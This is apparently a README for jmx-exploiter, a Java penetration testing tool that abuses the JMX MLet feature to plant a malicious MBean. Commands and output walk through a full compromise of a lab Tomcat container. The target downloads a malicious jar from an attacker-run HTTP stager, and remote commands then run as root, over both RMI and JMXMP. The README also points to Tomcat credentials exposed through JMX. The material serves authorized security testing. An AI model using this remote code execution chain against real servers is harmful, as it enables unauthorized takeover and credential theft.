## jmx-exploiter

*jmx-exploiter* is a command line tool written in Java, that is designed to attack JMX endpoints. 
*JMX* stands for **Java Management Extensions** and can be used to monitor and configure the Java Virtual Machine
from remote. Applications like *tomcat* or *JBoss* are often installed together with a *JMX* endpoint, which 
enables server administrators to monitor and manage the corresponding application.

*JMX* uses so called *MBeans* for monitoring and configuration tasks. The *JMX* Agent (sever, port) is basically
just an interface, that handles remote connections and supports methods to communicate with the underlying 
*MBean* objects. The actual functionality is then implemented in the *MBean* itself and the *JMX* Agent only relays
input and output to the *MBean* object.

By default, *JMX* endpoints support a *MBean* with name **MLet**. This *MBean* can be used to deploy new *MBean* objects on the 
*JMX* agent. The codebase for these new *MBean* objects can be gathered over the network e.g. in form of a HTTP request. Using
the **MLet** feature, attackers with access to a *JMX* agent can easily deploy their own malicious *MBean* objects and 
compromise the underlying application server. *jmx-exploiter* can support you during this part and handle the *MBean* deployment
and interaction for you. 


### Installation

-----

*jmx-exploiter* is a *Maven* project. This makes the installation a straight forward process and no manual installation of libraries
should be required. First of all, make sure that you have *maven* installed on your system:

```bash
sudo apt install maven      # Debian
pacman -s maven             # Arch
```

Then, clone the *jmx-exploiter* project in a location of your choice and run ``mvn package`` inside of the projects folder.

```bash
[pentester@kali opt]$ cd jmx-exploiter/
[pentester@kali jmx-exploiter]$ mvn package
[INFO] Scanning for projects...
[INFO] 
[INFO] -----------------< de.qtc.JmxExploiter:jmx-exploiter >------------------
[INFO] Building jmx-exploiter 1.0.0
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[...]
```

Since the main purpose of *jmx-exploiter* is the deployment of malicious *MBean* objects, you need also a corresponding *MBean* object.
Theoretically you can deploy any *MBean* object that fulfills the *MBean Specifications*. However, this project does also provide a reference
implementation, the [tonka-bean](./tonka-bean/). The *tonka-bean* is a separate maven project and you can compile it in the same way as
you compiled *jmx-exploiter*:

```bash
[pentester@kali jmx-exploiter]$ cd tonka-bean/
[pentester@kali tonka-bean]$ mvn package
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< de.qtc.TonkaBean:tonka-bean >---------------------
[INFO] Building tonka-bean 1.0.0
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[...]
```

After *maven* has finished, you should find the executable *.jar* files in the target folders of the corresponding projects.

```bash
[pentester@kali opt]$ ls -l jmx-exploiter/target/jmx-exploiter.jar 
-rw-r--r-- 1 pentester pentester 64393 Nov  5 07:21 jmx-exploiter/target/jmx-exploiter.jar
[pentester@kali opt]$ ls -l jmx-exploiter/tonka-bean/target/tonka-bean.jar 
-rw-r--r-- 1 pentester pentester 2636 Nov  5 07:23 jmx-exploiter/tonka-bean/target/tonka-bean.jar
```

*jmx-exploiter* does also support autocompletion for bash. To take advantage of autocompletion, *jmx-exploiter* should be available
in your path and the completion scripts need to be sourced on bash startup. This repository contains a small [installation script](/resoruces/install.sh)
that takes care of these things.

```bash
[pentester@kali resources]$ bash install.sh 
[+] Creating local completion script ~/.bash_completion
[+] Creating local completion folder ~/.bash_completion.d
[+] Creating jmx-exploiter completion script ~/.bash_completion.d/jmx-exploiter
[+] Creating symlink for jmx-exploiter
```

However, you can also setup completion manually by just looking at the source of the script and taking the corresponding actions on your own. 


### Usage

-----

In this chapter I want to show you the basic usage of *jmx-exploiter*. For demonstration purposes, I created a vulnerable docker container, running
an *Apache Tomcat* server with a *JMX* agent listening on port 9010. The corresponding [docker-files](./.docker/)
can be found inside this repository and should enable you to practice the usage of *jmx-exploiter* yourself. 

The listing below shows the nmap output for the corresponding container. Using the NSE-Script *rmi-dumpregistry* you can verify that port 9010 is running a *JMX* agent.

```bash
[pentester@kali opt]$ sudo nmap -sV 172.30.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 07:24 CET
Nmap scan report for 172.30.0.2
Host is up (0.0000070s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
8009/tcp open  ajp13    Apache Jserv (Protocol v1.3)
8080/tcp open  http     Apache Tomcat 9.0.2
9010/tcp open  java-rmi Java RMI
MAC Address: 02:42:AC:1E:00:02 (Unknown)

[pentester@kali opt]$ sudo nmap --script=rmi-dumpregistry  -p9010 -sV 172.30.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 07:25 CET
Nmap scan report for 172.30.0.2
Host is up (0.000025s latency).

PORT     STATE SERVICE  VERSION
9010/tcp open  java-rmi Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|      implements javax.management.remote.rmi.RMIServer, 
[...]
```

If you encounter a *JMX* endpoint during a pentest, you should first of all use [jconsole](https://docs.oracle.com/javase/7/docs/technotes/guides/management/jconsole.html)
to determine if you can connect to the *JMX* endpoint without valid credentials. Especially on *Tomcat* servers *jconsole* is interesting, since per default the credentials
of *Tomcat users* are accessible over the *JMX* interface:

![Tomcat Credentials](/images/01-tomcat-credentials.png)

However, with *jmx-exploiter* your first step is to launch the *status* command on the remote *JMX* endpoint:

```bash
[pentester@kali target]$ ./jmx-exploiter.jar 172.30.0.2 9010 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

The status command tells you that neither *MLet* nor your malicious *MBean* are registered on the *JMX* endpoint. You could now either deploy them one by one
by using the *deployMLet* and *deployMBean* commands, or you can simply use *deployAll* to deploy both in one step. But notice that for deploying the malicious *MBean*
the remote server needs to establish a HTTP connection to your listener. Therefore, you might need a firewall whitelisting and you have to use the corresponding
``--stagerHost`` and ``--stagerPort`` options of *jmx-exploiter*, to specify where your listener can be found. You can also specify these options in a configuration file
that looks like the one in the ``src`` folder of the project. The configuration file does also allow you to specify advanced options, like controlling the name of 
the deployed *MBean*. Lastly, make sure that the *MBean* you want to deploy can be found in the path that is specified in your configuration file (default is: ``/opt/jmx-exploiter/tonka-bean/target/``).

```bash
[pentester@kali deploy]$ ls
config.properties  jmx-exploiter.jar  tonka-bean
[pentester@kali deploy]$ cat config.properties 
defaultCmd=id
stagerPort=8080
stagerHost=172.30.0.1
[pentester@kali deploy]$ ./jmx-exploiter.jar -c config.properties 172.30.0.2 9010 deployAll
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Creating MBean 'MLet' for remote deploymet... done!
[+]
[+] Malicious Bean seems not to be registered on the server
[+] Starting registration process
[+] 	Creating HTTP server on 172.30.0.1:8080
[+] 		Creating MLetHandler for endpoint /mlet... done!
[+] 		Creating JarHandler for endpoint /tonka-bean.jar... done!
[+]		Starting the HTTP server... done!
[+]
[+] 	Received request for /mlet
[+] 	Sending malicious mlet:
[+]
[+] 		Class:		de.qtc.tonkabean.TonkaBean
[+] 		Archive:	tonka-bean.jar
[+] 		Object:		MLetTonkaBean:name=TonkaBean,id=1
[+] 		Codebase:	http://172.30.0.1:8080
[+]
[+] 	Received request for /tonka-bean.jar
[+] 	Sending malicious jar file... done!
[+]
[+] malicious Bean was successfully registered
```

The output suggests that the deployment worked like expected. You can verify this situation either by using the *status* command again, or by searching your *MBean*
inside of *jconsole*:

```bash
[pentester@kali deploy]$ ./jmx-exploiter.jar 172.30.0.2 9010 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is registered on the JMX server.
```

![Bean Deployed](/images/02-tonka-bean.png)


If you deployed your own malicious *MBean*, you can now invoke your *MBean* methods directly from *jconsole*. While this is also possible for the *tonka-bean*, *jmx-exploiter*
also supports options to interact with the *tonka-bean* from the command line:

```bash
[pentester@kali deploy]$ ./jmx-exploiter.jar 172.30.0.2 9010 execute --exec id 
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending command 'id' to the server... done!
[+] Servers answer is: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Once you are done with your *MBean*, you should make sure to undeploy all changes that you have made to the server. At least you should remove your malicious *MBean* from the server, 
but if *MLet* was not available when you started, you should also remove the *MLet*. *jmx-exploiter* makes the cleanup pretty easy, by just invoking:

```bash
[pentester@kali deploy]$ ./jmx-exploiter.jar -c config.properties 172.30.0.2 9010 undeployAll
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Unregister malicious bean... done!
[+] Unregister MBean 'MLet'... done!
```

Now the *JMX* endpoint should be clean again and *MLet* and your malicious *MBean* should be removed.


### JMXMP Support

-----

Recently I tested a host system that had a JMXMP (JMX Messaging Protocol) listener running. JMXMP is just an alternate way to access a JMX agent and differs in some
points from the Java RMI access as described above. However, for the purpose of this tool, these differences do not really matter. The important thing is that also 
the JMXMP connector can allow unauthenticated connections and it is also possible to use the **MLet MBean** over this connector. 

The required classes for the JMXMP connector can be found inside a *.jar* file called *jmxremote_optional.jar*. Unfortunately, this *.jar* does not has its own project
on Maven anymore (it seems like it was an artifact of the JMX project once, but was removed for some reason). Now, it can be loaded as an artifact of other projects.
*jmx-exploiter* supports the JMXMP protocol by using the *jmxremote-optional* artifact from *org.glassfish.external*. 

In order to test the JMXMP support, the provided [docker-image](./.docker/) does also open a JMXMP listener on port 8888. Shout out to [nickman](https://github.com/nickman)
who provided the [JMXMP Agent](https://github.com/nickman/JMXMPAgent) implementation. This project made the setup of JMXMP really simple. The following listing shows
just the same examples as above, but this time using the JMXMP protocol:

```
[pentester@kali target]$ ./jmx-exploiter.jar --jmxmp -sh 172.30.0.1 172.30.0.2 8888 status
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
[pentester@kali target]$ ./jmx-exploiter.jar --jmxmp -sh 172.30.0.1 172.30.0.2 8888 deployAll
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Creating MBean 'MLet' for remote deploymet... done!
[+]
[+] Malicious Bean seems not to be registered on the server
[+] Starting registration process
[+] 	Creating HTTP server on 172.30.0.1:8080
[+] 		Creating MLetHandler for endpoint /mlet... done!
[+] 		Creating JarHandler for endpoint /tonka-bean.jar... done!
[+]		Starting the HTTP server... done!
[+]
[+] 	Received request for /mlet
[+] 	Sending malicious mlet:
[+]
[+] 		Class:		de.qtc.tonkabean.TonkaBean
[+] 		Archive:	tonka-bean.jar
[+] 		Object:		MLetTonkaBean:name=TonkaBean,id=1
[+] 		Codebase:	http://172.30.0.1:8080
[+]
[+] 	Received request for /tonka-bean.jar
[+] 	Sending malicious jar file... done!
[+]
[+] malicious Bean was successfully registered
[pentester@kali target]$ ./jmx-exploiter.jar --jmxmp -sh 172.30.0.1 172.30.0.2 8888 execute
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending command 'id' to the server... done!
[+] Servers answer is: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Also notice that you can use *jconsole* to connect to a running JMX agent via JMXMP. Instead of simply specifying the host and port number for the connection, 
you have to use the JMXMP service URI ``service:jmx:jmxmp://<JMXMPHOST>:<JMXMPPORT>`` and you have to make sure that the *jmxremote_optional.jar* is inside your
classpath.


### Advanced Usage

-----

In the previous chapter we already mentioned that *jmx-exploiter* can read options from a configuration file and from the command line. Options that would require long values, 
like the name of the *MBean* class or the corresponding object name can only be passed inside of the configuration file. The following snipped shows you the default configuration
file that is used by *jmx-exploiter* internally:

```properties
defaultCmd=id
stagerPort=8080
stagerHost=127.0.0.1

username=null
password=null
boundName=jmxrmi

jarPath=./tonka-bean/target/
jarName=tonka-bean.jar
mLetName=DefaultDomain:type=MLet
beanClass=de.qtc.tonkabean.TonkaBean
objectName=MLetTonkaBean:name=TonkaBean,id=1
```

In situations where the server cannot access your host because of restrictive firewall rules, you may be able to use the ``--remoteStager`` option to specify a remote stager host.
If you have access to the *remoteStager*, you can also use *jmx-exploiter* from there by using the ``--stagerOnly`` option, which only spawns the HTTP listener. When using this option,
no additional command line parameters are required. However, you still need to specify the correct stager host, either by using command line options or a configuration file.


### Why jmx-exploiter

-----

The reader might argue that there are already many pre existing tools that support this kind of exploitation on *JMX* endpoints and that *jmx-epxloiter* seems to be a little
bit superfluous. Well, while it is generally correct that there exist already many tools for this kind of exploitation (the most famous one is probably *Metasploit*), all these
other tools are missing the flexibility that *jmx-exploiter* provides. The *MBeans* that are used by other tools are often just binary blobs that are designed to achieve one 
specific task, like a reverse shell. *jmx-exploiter* and the *tonka-bean* reference implementation of a malicious *MBean* enable you to create and deploy your own *MBeans* on the fly. 
Furthermore, the code of the *tonka-bean* is available in plain Java and compilation is done on your own. You can determine exactly what the *MBean* is doing, modify things that
you do not like, extend the *MBean* and you are safe from surprising side effects. 

*jmx-exploiter* does support the JMXMP protocol. Beside Java RMI, JMXMP represents a second popular method to communicate with a running JMX agent. In contrast to the RMI approach, 
JMXMP does not require an additional registry service and is therefore a good solution on restrictive fire-walled host systems. While other tools focus usually on the RMI access method,
*jmx-exploiter* supports both for a maximum flexibility.

Finally, I did not find any tool that supports a cleanup operation after the exploitation is done. E.g. Metasploit leaves an ugly named *MBean* inside of 
the *JMX* interface, that can be accessed by anyone. This could be annoying for customers and is just bad practice. With the undeploy feature of *jmx-exploiter* you can 
restore the clean state of the *JMX* endpoint.


### Credits

-----

* The initial idea and also the initial codebase of the tool were taken from [this blogpost](https://www.optiv.com/blog/exploiting-jmx-rmi).
* For the JMXMP implementation, the tools provided by [nickman](https://github.com/nickman) were really helpful.


Copyright 2019, Tobias Neitzel and contributors.
